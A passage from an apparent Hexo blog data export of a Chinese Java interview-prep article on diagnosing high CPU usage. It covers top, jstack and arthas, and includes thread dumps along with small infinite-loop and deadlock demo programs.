 \n        at java.io.BufferedReader.readLine(BufferedReader.java:389)  \n        at com.intellij.rt.execution.application.AppMainV2$1.run(AppMainV2.java:47)  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"Signal Dispatcher\" #4 daemon prio=9 os\\_prio=31 tid=0x00007fb544026000 nid=0x4603 runnable \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"Finalizer\" #3 daemon prio=8 os\\_prio=31 tid=0x00007fb544817000 nid=0x5103 in Object.wait() \\[0x0000700002098000\\]  \n   java.lang.Thread.State: WAITING (on object monitor)  \n        at java.lang.Object.wait(Native Method)  \n        - waiting on <0x0000000795588ed0\\> (a java.lang.ref.ReferenceQueue$Lock)  \n        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:144)  \n        - locked <0x0000000795588ed0\\> (a java.lang.ref.ReferenceQueue$Lock)  \n        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:165)  \n        at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:216)  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"Reference Handler\" #2 daemon prio=10 os\\_prio=31 tid=0x00007fb54303f800 nid=0x2c03 in Object.wait() \\[0x0000700001f95000\\]  \n   java.lang.Thread.State: WAITING (on object monitor)  \n        at java.lang.Object.wait(Native Method)  \n        - waiting on <0x0000000795586bf8\\> (a java.lang.ref.Reference$Lock)  \n        at java.lang.Object.wait(Object.java:502)  \n        at java.lang.ref.Reference.tryHandlePending(Reference.java:191)  \n        - locked <0x0000000795586bf8\\> (a java.lang.ref.Reference$Lock)  \n        at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"main\" #1 prio=5 os\\_prio=31 tid=0x00007fb54280e000 nid=0xe03 waiting on condition \\[0x0000700001983000\\]  \n   java.lang.Thread.State: TIMED\\_WAITING (sleeping)  \n        at java.lang.Thread.sleep(Native Method)  \n        at com.jvm.JVMtest.main(JVMtest.java:6)  \n  \n   Locked ownable synchronizers:  \n        - None  \n  \n\"VM Thread\" os\\_prio=31 tid=0x00007fb544816800 nid=0x5303 runnable   \n  \n\"GC task thread#0 (ParallelGC)\" os\\_prio=31 tid=0x00007fb544009800 nid=0x2507 runnable   \n  \n\"GC task thread#1 (ParallelGC)\" os\\_prio=31 tid=0x00007fb54300f800 nid=0x2403 runnable   \n  \n\"GC task thread#2 (ParallelGC)\" os\\_prio=31 tid=0x00007fb543010000 nid=0x2303 runnable   \n  \n\"GC task thread#3 (ParallelGC)\" os\\_prio=31 tid=0x00007fb543010800 nid=0x2a03 runnable   \n  \n\"VM Periodic Task Thread\" os\\_prio=31 tid=0x00007fb5430b4800 nid=0x3f03 waiting on condition   \n  \nJNI global references: 15  \n  \n\n\n\n```\n\n你会发现上面的信息其实是一段一段的，摘取其中的一段为大家说明:\n\n```\n\n\n\"main\" #1 prio=5 os\\_prio=31 tid=0x00007fb54280e000 nid=0xe03 waiting on condition \\[0x0000700001983000\\]  \n   java.lang.Thread.State: TIMED\\_WAITING (sleeping)  \n        at java.lang.Thread.sleep(Native Method)  \n        at com.jvm.JVMtest.main(JVMtest.java:6)  \n\n\n\n```\n\n`main`:线程名称\n\n`#1`:当前线程ID，从main开始，jvm会根据线程创建的顺序为其线程编号\n\n`prio`:优先级的顺序，一般默认是5\n\n`os_prio`:线程对应系统的优先级\n\n`tid`:java内的线程id\n\n`nid`:操作系统级别的线程id，是一个十六进制\n\n关于线程的信息:\n\n`NEW`:线程新建，还没开始运行\n\n`RUNNABLE`:正在java虚拟机中运行的线程\n\n`BLOCKED` :被阻塞，正在等待监视器锁的线程\n\n`WAITING` :无限期等待另一个线程执行特定操作的线程\n\n`TIMED_WAITING`:等待另一个线程执行操作达到指定等待时间的线程\n\n`TERMINATED`:已经退出的线程\n\n我们这里关注的最多的就是`nid`\n\n### 4.2.使用jstack解决CPU占用很高的问题并定位具体行数\n\n先来看一段代码:\n\n```\n\n\npackage com.jvm;  \n  \nimport java.util.concurrent.ExecutorService;  \nimport java.util.concurrent.Executors;  \n  \npublic class JVMCPU {  \n    private static ExecutorService service = Executors.newFixedThreadPool(5);  \n    private static Object lock = new Object();  \n    public static class yupengTask implements Runnable{  \n  \n        @Override  \n        public void run() {  \n            synchronized (lock){  \n                long sum = 0L;  \n                while(true){  \n                    sum +=1;  \n                }  \n            }  \n        }  \n    }  \n    public static void main(String\\[\\] args) {  \n  \n        yupengTask yupengTask = new yupengTask();  \n        service.execute(yupengTask);  \n  \n    }  \n}  \n  \n\n\n\n```\n\n将这段代码上传到linux服务器，并且使用`nohup java JVMCPU &`运行\n\n![](./2024/06/16/CPU打满怎么处理/8.png)\n使用`top`命令可以看到cpu被打满了\n\n![](./2024/06/16/CPU打满怎么处理/9.png)\n知道了进程的PID，如何找到进程下是哪个线程呢?可以使用命令`top -Hp 26964`，如下所示\n\n![](./2024/06/16/CPU打满怎么处理/10.png)\n从上面的图可以看到，cpu占用最多的线程是26976这个线程id，接下来就是使用`jstack`命令来查看程序的所有堆栈信息，但是，这里需要有一个注意的点，26876这个是一个十进制\n\n的，使用jstack看到的nid是十六进制，所以我们需要转换，可以使用`printf \"%x\\n\"`这个命令\n\n![](./2024/06/16/CPU打满怎么处理/11.png)\n接下来使用`jstack -l 26964`打印堆栈信息\n\n```\n\n\n2024\\-06\\-08 12:17:36  \nFull thread dump Java HotSpot(TM) 64-Bit Server VM (25.281\\-b09 mixed mode):  \n  \n\"Attach Listener\" #10 daemon prio=9 os\\_prio=0 tid=0x00007f006c001000 nid=0xc7f waiting on condition \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"DestroyJavaVM\" #9 prio=5 os\\_prio=0 tid=0x00007f00a0009800 nid=0x6955 waiting on condition \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"pool-1-thread-1\" #8 prio=5 os\\_prio=0 tid=0x00007f00a00f0000 nid=0x6960 runnable \\[0x00007f008b0ef000\\]  \n   java.lang.Thread.State: RUNNABLE  \n\tat JVMCPU$yupengTask.run(JVMCPU.java:14)  \n\t- locked <0x00000000f59dfcf0\\> (a java.lang.Object)  \n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)  \n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)  \n\tat java.lang.Thread.run(Thread.java:748)  \n  \n   Locked ownable synchronizers:  \n\t- <0x00000000f59e0ed0\\> (a java.util.concurrent.ThreadPoolExecutor$Worker)  \n  \n\"Service Thread\" #7 daemon prio=9 os\\_prio=0 tid=0x00007f00a00d4800 nid=0x695e runnable \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"C1 CompilerThread1\" #6 daemon prio=9 os\\_prio=0 tid=0x00007f00a00b9800 nid=0x695d waiting on condition \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"C2 CompilerThread0\" #5 daemon prio=9 os\\_prio=0 tid=0x00007f00a00b6800 nid=0x695c waiting on condition \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"Signal Dispatcher\" #4 daemon prio=9 os\\_prio=0 tid=0x00007f00a00b5000 nid=0x695b runnable \\[0x0000000000000000\\]  \n   java.lang.Thread.State: RUNNABLE  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"Finalizer\" #3 daemon prio=8 os\\_prio=0 tid=0x00007f00a0082000 nid=0x695a in Object.wait() \\[0x00007f008b6f5000\\]  \n   java.lang.Thread.State: WAITING (on object monitor)  \n\tat java.lang.Object.wait(Native Method)  \n\t- waiting on <0x00000000f5988ee0\\> (a java.lang.ref.ReferenceQueue$Lock)  \n\tat java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:144)  \n\t- locked <0x00000000f5988ee0\\> (a java.lang.ref.ReferenceQueue$Lock)  \n\tat java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:165)  \n\tat java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:216)  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"Reference Handler\" #2 daemon prio=10 os\\_prio=0 tid=0x00007f00a007d800 nid=0x6959 in Object.wait() \\[0x00007f008b7f6000\\]  \n   java.lang.Thread.State: WAITING (on object monitor)  \n\tat java.lang.Object.wait(Native Method)  \n\t- waiting on <0x00000000f5986c00\\> (a java.lang.ref.Reference$Lock)  \n\tat java.lang.Object.wait(Object.java:502)  \n\tat java.lang.ref.Reference.tryHandlePending(Reference.java:191)  \n\t- locked <0x00000000f5986c00\\> (a java.lang.ref.Reference$Lock)  \n\tat java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)  \n  \n   Locked ownable synchronizers:  \n\t- None  \n  \n\"VM Thread\" os\\_prio=0 tid=0x00007f00a0074000 nid=0x6958 runnable   \n  \n\"GC task thread#0 (ParallelGC)\" os\\_prio=0 tid=0x00007f00a001e800 nid=0x6956 runnable   \n  \n\"GC task thread#1 (ParallelGC)\" os\\_prio=0 tid=0x00007f00a0020800 nid=0x6957 runnable   \n  \n\"VM Periodic Task Thread\" os\\_prio=0 tid=0x00007f00a00d7800 nid=0x695f waiting on condition   \n  \nJNI global references: 5  \n  \n  \n\n\n\n```\n\n从上面的信息中，可以看到转换的结果和nid是一致的，\n\n从下面的信息中就可以看到问题其实是出现在`JVMCPU.java`的14行左右，这里给出的是14行，但是实际情况是14行的附近\n\n```\n\n\n\"pool-1-thread-1\" #8 prio=5 os\\_prio=0 tid=0x00007f00a00f0000 nid=0x6960 runnable \\[0x00007f008b0ef000\\]  \n   java.lang.Thread.State: RUNNABLE  \n\tat JVMCPU$yupengTask.run(JVMCPU.java:14)  \n\t- locked <0x00000000f59dfcf0\\> (a java.lang.Object)  \n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)  \n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)  \n\tat java.lang.Thread.run(Thread.java:748)  \n\n\n\n```\n\n结合代码来看一下就很容易问题\n\n![](./2024/06/16/CPU打满怎么处理/12.png)\n> 此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。\n\n5.使用arthas解决CPU占用很高的问题，定位具体代码行\n------------------------------\n\n使用arthas解决CPU 100%问题，在方法论上要用到两个命令，\n\n*   dashboard 命令查看TOP N线程，\n\n*   thread 命令查看堆栈信息\n\n\n![](./2024/06/16/CPU打满怎么处理/13.png)\n先来运行`arthas`\n\n![](./2024/06/16/CPU打满怎么处理/14.png)\n输入1显示如下\n\n![](./2024/06/16/CPU打满怎么处理/15.png)\n输入`dashboard`命令可以看到是哪个线程占用cpu最高\n\n![](./2024/06/16/CPU打满怎么处理/16.png)\n接下来输入`thread -n 3`，表示最忙的前3个线程并打印信息\n\n![](./2024/06/16/CPU打满怎么处理/17.png)\n从上面的图中可以看到arthas和jstack展示的信息差不多，都定位到了`JVMCPU.java`的14行程序\n\n6.死锁导致CPU占用很高的问题分析\n------------------\n\n先来看一段代码:\n\n```\n\n\npublic class DeadlockDemo {  \n  \n    // 创建两个锁对象  \n    private static final Object lock1 = new Object();  \n    private static final Object lock2 = new Object();  \n  \n    public static void main(String\\[\\] args) {  \n  \n        // 线程1尝试获取lock1，然后获取lock2  \n        Thread thread1 = new Thread(() -> {  \n            synchronized (lock1) {  \n                System.out.println(\"Thread 1: Holding lock 1...\");  \n  \n                try { Thread.sleep(100); }   \n                catch (InterruptedException e) {}  \n  \n                System.out.println(\"Thread 1: Waiting for lock 2...\");  \n  \n                synchronized (lock2) {  \n                    System.out.println(\"Thread 1: Holding lock 1 & 2...\");  \n                }  \n            }  \n        });  \n  \n        // 线程2尝试获取lock2，然后获取lock1  \n        Thread thread2 = new Thread(() -> {  \n            synchronized (lock2) {  \n                System.out.println(\"Thread 2: Holding lock 2...\");  \n  \n                try { Thread.sleep(100); }   \n                catch (InterruptedException e) {}  \n  \n                System.out.println(\"Thread 2: Waiting for lock 1...\");  \n  \n                synchronized (lock1) {  \n                    System.out.println(\"Thread 2: Holding lock 2 & 1...\");  \n                }  \n            }  \n        });  \n  \n        thread1.start();  \n        thread2.start();  \n    }  \n}  \n\n\n\n```\n\n将上面的代码上传到服务器，使用`nohuo java DeadlockDemo &`运行起来\n\n![](./2024/06/16/CPU打满怎么处理/18.png)\n接下来使用arthas进行分析\n\n> 这里选择arthas，不选择jstack是因为arthas更加的方便，它的功能也比jstack丰富\n\n输入thread就可以输出线程的统计信息，其中BLOCKED代表当前阻塞的线程数\n\n![](./2024/06/16/CPU打满怎么处理/19.png)\n接下来，输入`thread -b`就可以看到线程具体的情况，在下面的图中已经准确的说明了代码在哪一行\n\n![](./2024/06/16/CPU打满怎么处理/20.png)\n> 此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。\n\n7.小提示\n-----\n\n工具的选择建议使用arthas，它还有很多的功能在实际中很有用\n\n大家在面试的时候如果遇到cpu被打满该如何排查这样的问题，不要上来就是使用arthas来定位问题，我们的第一反应永远都是回滚版本，\n\n因为在实际中代码的问题需要分析，不会像举例子这么简单，代码经过分析改动再上线，会浪费很多时间，而有的业务是绝对不允许这么操作的，比如电商，金融的业务，\n\n所以在回答面试官的问题时候一定要先说回滚，在说解决办法.\n\n\n","slug":"CPU打满怎么处理","published":1,"updated":"2024-06-16T13:54:26.306Z","comments":1,"layout":"post","photos":[],"_id":"clylh1rxw0007bsuh1nfh90ie","content":"<h2 id=\"1-cpu占用很高的3大类型，9大场景\"><a href=\"#1-cpu占用很高的3大类型，9大场景\" class=\"headerlink\" title=\"1.cpu占用很高的3大类型，9大场景:\"></a>1.cpu占用很高的3大类型，9大场景:</h2><p>CPU 飙升是一个常见的问题。</p>\n<p>在生产环境中，会出现由代码问题导致CPU占用很高，该如何诊断出是哪行java代码导致? 是大家的一项重要基本功，也是大家面试中的家常骗饭。</p>\n<p>如果连CPU 飙升的问题都回答不清楚， 都支支吾吾， 面试就很难通过了</p>\n<p>下面，用20多年的技术内功洪荒之力，给大家梳理一下 cpu占用很高的三大类型问题，9大问题场景。</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/1.png\"></p>\n<h3 id=\"第1大类型导致CPU100-的问题：-业务类问题\"><a href=\"#第1大类型导致CPU100-的问题：-业务类问题\" class=\"headerlink\" title=\"第1大类型导致CPU100%的问题： 业务类问题\"></a>第1大类型导致CPU100%的问题： 业务类问题</h3><p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/2.png\"></p>\n<h4 id=\"1-1-死循环\"><a href=\"#1-1-死循环\" class=\"headerlink\" title=\"1.1 死循环\"></a>1.1 死循环</h4><blockquote>\n<p>while(true)条件</p>\n</blockquote>\n<p>导致 CPU 占用率高的最简单但最具破坏性的编程错误之一就是死循环。</p>\n<p>当程序中的循环缺乏正确的退出条件或条件从未满足时，就会出现这种情况，</p>\n<p>死循环无休止地运行，消耗过多的处理器时间，导致CPU100%</p>\n<h4 id=\"1-2-死锁\"><a href=\"#1-2-死锁\" class=\"headerlink\" title=\"1.2 死锁\"></a>1.2 死锁</h4><p>发生死锁后，就会存在忙等待或自旋锁等编程问题，从而导致 繁忙等待问题。</p>\n<p>即进程在不释放 CPU 的情况下反复检查条件是否满足，会导致 CPU 占用率居高不下。</p>\n<p>这种低效率的资源使用会妨碍 CPU 执行其他任务。</p>\n<h4 id=\"1-3-不必要的代码块\"><a href=\"#1-3-不必要的代码块\" class=\"headerlink\" title=\"1.3 不必要的代码块\"></a>1.3 不必要的代码块</h4><p>在不需要的地方使用<code>synchronized</code>块，会导致线程竞争和上下文切换</p>\n<p>解决方案:尽量减少同步块的使用范围</p>\n<h3 id=\"第2大类型导致CPU100-的问题：并发类问题\"><a href=\"#第2大类型导致CPU100-的问题：并发类问题\" class=\"headerlink\" title=\"第2大类型导致CPU100%的问题：并发类问题\"></a>第2大类型导致CPU100%的问题：并发类问题</h3><p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/3.png\"></p>\n<h4 id=\"1-4-大量计算密集型的任务\"><a href=\"#1-4-大量计算密集型的任务\" class=\"headerlink\" title=\"1.4 大量计算密集型的任务\"></a>1.4 大量计算密集型的任务</h4><p>比如复杂的数学计算，图像处理，视频编码</p>\n<p>计算密集型的任务需要大量的计算能力。在没有足够系统资源的情况下运行这些应用程序，可能会导致 CPU 占用率达到 100%，因为它们试图执行高要求的任务。</p>\n<p>解决方案:优化算法，使用更高效的库，或者利用并行计算来分摊</p>\n<h4 id=\"1-5-大量并发线程\"><a href=\"#1-5-大量并发线程\" class=\"headerlink\" title=\"1.5 大量并发线程\"></a>1.5 大量并发线程</h4><p>多个线程同时运行会导致对 CPU 资源的竞争，尤其是当其中许多线程都是资源密集型进程时。</p>\n<p>这会导致所有线程获得的 CPU 时间减少，当每个线程都试图完成自己的任务时，CPU 时间可能会被耗尽。</p>\n<h4 id=\"1-6-大量的上下文切换\"><a href=\"#1-6-大量的上下文切换\" class=\"headerlink\" title=\"1.6 大量的上下文切换\"></a>1.6 大量的上下文切换</h4><p>创建过多的线程，导致频繁的上下文切换</p>\n<p>解决方案:使用线程池来管理线程的数量</p>\n<h3 id=\"第3大类导致CPU100-的问题：内存类问题\"><a href=\"#第3大类导致CPU100-的问题：内存类问题\" class=\"headerlink\" title=\"第3大类导致CPU100%的问题：内存类问题\"></a>第3大类导致CPU100%的问题：内存类问题</h3><p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/4.png\"></p>\n<h4 id=\"1-7-内存不足\"><a href=\"#1-7-内存不足\" class=\"headerlink\" title=\"1.7 内存不足\"></a>1.7 内存不足</h4><p>当系统内存不足时，就会将磁盘存储作为虚拟内存使用，而虚拟内存的运行速度要慢得多。</p>\n<p>这种<strong>过度的分页和交换</strong>会导致 CPU 占用率居高不下，因为处理器需要花费更多时间来管理内存访问，而不是高效地执行进程。</p>\n<h4 id=\"1-8-频繁GC\"><a href=\"#1-8-频繁GC\" class=\"headerlink\" title=\"1.8 频繁GC\"></a>1.8 频繁GC</h4><p>创建大量的短生命周期的对象，频繁触发GC</p>\n<p>解决方案: 优化代码， 减少对象的创建 ，或者调整JVM的参数来优化</p>\n<h4 id=\"1-9-内存泄漏\"><a href=\"#1-9-内存泄漏\" class=\"headerlink\" title=\"1.9 内存泄漏\"></a>1.9 内存泄漏</h4><p>程序持续分配内存但不释放，会导致频繁的GC</p>\n<p>解决方案:使用内存分析工具VisualVM进行检测和修复</p>\n<h2 id=\"2-CPU100-定位的两大神器\"><a href=\"#2-CPU100-定位的两大神器\" class=\"headerlink\" title=\"2.CPU100%定位的两大神器:\"></a>2.CPU100%定位的两大神器:</h2><p>想要定位到具体是哪一行的代码导致， 一般都会使用下面的两大神器</p>\n<ul>\n<li><p>通常使用的jvm自带的工具jstack，</p>\n</li>\n<li><p>还有一种就是开源神器arthas，</p>\n</li>\n</ul>\n<p>一般而言，arthas还有其它的功能，所以选择它多一点.</p>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/5.png\"><br>在后面的讲解中，</p>\n<p>会首先讲解jstack， 使用jstack来解决实际遇到的问题，</p>\n<p>然后在使用第二大神器 arthas来解决相同的问题，</p>\n<p>大家可以在这两个工具使用过程中选择自己比较顺手的， 这里推荐 arthas， 关于arthas的细致学习，请参考的《arthas 学习圣经》 PDF。</p>\n<blockquote>\n<p>此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。</p>\n</blockquote>\n<h2 id=\"3-CPU-飙升100-的解决思路与方法论\"><a href=\"#3-CPU-飙升100-的解决思路与方法论\" class=\"headerlink\" title=\"3 CPU 飙升100%的解决思路与方法论\"></a>3 CPU 飙升100%的解决思路与方法论</h2><h2 id=\"4-使用jstack-解决CPU-100-问题实操\"><a href=\"#4-使用jstack-解决CPU-100-问题实操\" class=\"headerlink\" title=\"4 使用jstack 解决CPU 100%问题实操\"></a><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/6.png\"><br>4 使用jstack 解决CPU 100%问题实操</h2><p>使用jstack 解决CPU 100%问题，在方法论上要用到两个命令，</p>\n<ul>\n<li><p>top 命令查看TOP N线程，</p>\n</li>\n<li><p>jstack命令查看堆栈信息</p>\n</li>\n</ul>\n<p><img src=\"/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/7.png\"></p>\n<blockquote>\n<p>此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。</p>\n</blockquote>\n<h3 id=\"4-1-jstack命令讲解\"><a href=\"#4-1-jstack命令讲解\" class=\"headerlink\" title=\"4.1.jstack命令讲解\"></a>4.1.jstack命令讲解</h3><p>命令jstack是java堆栈的跟踪工具，可以打印出程序中所有线程的堆栈信息，包括线程状态，调用栈信息，锁信息等。</p>\n<p>jstack可以诊断线程死锁、内存泄漏等问题</p>\n<p>命令格式: jstack [options] pid</p>\n<blockquote>\n<p>常用例子: jstack -l pid，查看线程的堆栈信息</p>\n</blockquote>\n<p>堆栈信息解读:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">yupengdembp:TestYupeng yupeng$ jstack -l 43953  </span><br><span class=\"line\">2024\\-06\\-08 10:14:45  </span><br><span class=\"line\">Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.191\\-b12 mixed mode):  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Attach Listener&quot; #10 daemon prio=9 os\\_prio=31 tid=0x00007fb54485a000 nid=0x3503 waiting on condition \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Service Thread&quot; #9 daemon prio=9 os\\_prio=31 tid=0x00007fb5430b4000 nid=0x3203 runnable \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;C1 CompilerThread2&quot; #8 daemon prio=9 os\\_prio=31 tid=0x00007fb54407e800 nid=0x3103 runnable \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;C2 CompilerThread1&quot; #7 daemon prio=9 os\\_prio=31 tid=0x00007fb54400f800 nid=0x4203 runnable \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;C2 CompilerThread0&quot; #6 daemon prio=9 os\\_prio=31 tid=0x00007fb54285a000 nid=0x4403 waiting on condition \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Monitor Ctrl-Break&quot; #5 daemon prio=5 os\\_prio=31 tid=0x00007fb5430ab000 nid=0x4503 runnable \\[0x0000700002427000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">        at java.net.SocketInputStream.socketRead0(Native Method)  </span><br><span class=\"line\">        at java.net.SocketInputStream.socketRead(SocketInputStream.java:116)  </span><br><span class=\"line\">        at java.net.SocketInputStream.read(SocketInputStream.java:171)  </span><br><span class=\"line\">        at java.net.SocketInputStream.read(SocketInputStream.java:141)  </span><br><span class=\"line\">        at sun.nio.cs.StreamDecoder.readBytes(StreamDecoder.java:284)  </span><br><span class=\"line\">        at sun.nio.cs.StreamDecoder.implRead(StreamDecoder.java:326)  </span><br><span class=\"line\">        at sun.nio.cs.StreamDecoder.read(StreamDecoder.java:178)  </span><br><span class=\"line\">        - locked &lt;0x000000079570b9e0\\&gt; (a java.io.InputStreamReader)  </span><br><span class=\"line\">        at java.io.InputStreamReader.read(InputStreamReader.java:184)  </span><br><span class=\"line\">        at java.io.BufferedReader.fill(BufferedReader.java:161)  </span><br><span class=\"line\">        at java.io.BufferedReader.readLine(BufferedReader.java:324)  </span><br><span class=\"line\">        - locked &lt;0x000000079570b9e0\\&gt; (a java.io.InputStreamReader)  </span><br><span class=\"line\">        at java.io.BufferedReader.readLine(BufferedReader.java:389)  </span><br><span class=\"line\">        at com.intellij.rt.execution.application.AppMainV2$1.run(AppMainV2.java:47)  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Signal Dispatcher&quot; #4 daemon prio=9 os\\_prio=31 tid=0x00007fb544026000 nid=0x4603 runnable \\[0x0000000000000000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: RUNNABLE  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Finalizer&quot; #3 daemon prio=8 os\\_prio=31 tid=0x00007fb544817000 nid=0x5103 in Object.wait() \\[0x0000700002098000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: WAITING (on object monitor)  </span><br><span class=\"line\">        at java.lang.Object.wait(Native Method)  </span><br><span class=\"line\">        - waiting on &lt;0x0000000795588ed0\\&gt; (a java.lang.ref.ReferenceQueue$Lock)  </span><br><span class=\"line\">        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:144)  </span><br><span class=\"line\">        - locked &lt;0x0000000795588ed0\\&gt; (a java.lang.ref.ReferenceQueue$Lock)  </span><br><span class=\"line\">        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:165)  </span><br><span class=\"line\">        at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:216)  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;Reference Handler&quot; #2 daemon prio=10 os\\_prio=31 tid=0x00007fb54303f800 nid=0x2c03 in Object.wait() \\[0x0000700001f95000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: WAITING (on object monitor)  </span><br><span class=\"line\">        at java.lang.Object.wait(Native Method)  </span><br><span class=\"line\">        - waiting on &lt;0x0000000795586bf8\\&gt; (a java.lang.ref.Reference$Lock)  </span><br><span class=\"line\">        at java.lang.Object.wait(Object.java:502)  </span><br><span class=\"line\">        at java.lang.ref.Reference.tryHandlePending(Reference.java:191)  </span><br><span class=\"line\">        - locked &lt;0x0000000795586bf8\\&gt; (a java.lang.ref.Reference$Lock)  </span><br><span class=\"line\">        at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;main&quot; #1 prio=5 os\\_prio=31 tid=0x00007fb54280e000 nid=0xe03 waiting on condition \\[0x0000700001983000\\]  </span><br><span class=\"line\">   java.lang.Thread.State: TIMED\\_WAITING (sleeping)  </span><br><span class=\"line\">        at java.lang.Thread.sleep(Native Method)  </span><br><span class=\"line\">        at com.jvm.JVMtest.main(JVMtest.java:6)  </span><br><span class=\"line\">  </span><br><span class=\"line\">   Locked ownable synchronizers:  </span><br><span class=\"line\">        - None  </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;VM Thread&quot; os\\_prio=31 tid=0x00007fb544816800 nid=0x5303 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;GC task thread#0 (ParallelGC)&quot; os\\_prio=31 tid=0x00007fb544009800 nid=0x2507 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;GC task thread#1 (ParallelGC)&quot; os\\_prio=31 tid=0x00007fb54300f800 nid=0x2403 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;GC task thread#2 (ParallelGC)&quot; os\\_prio=31 tid=0x00007fb543010000 nid=0x2303 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;GC task thread#3 (ParallelGC)&quot; os\\_prio=31 tid=0x00007fb543010800 nid=0x2a03 runnable   </span><br><span class=\"line\">  </span><br><span class=\"line\">&quot;VM Periodic Task Thread&quot; os\\_prio=31 tid=0x00007fb5430b4800 nid=0x3f03 waiting on condition   </span><br><span class=\"line\">  </span><br><span 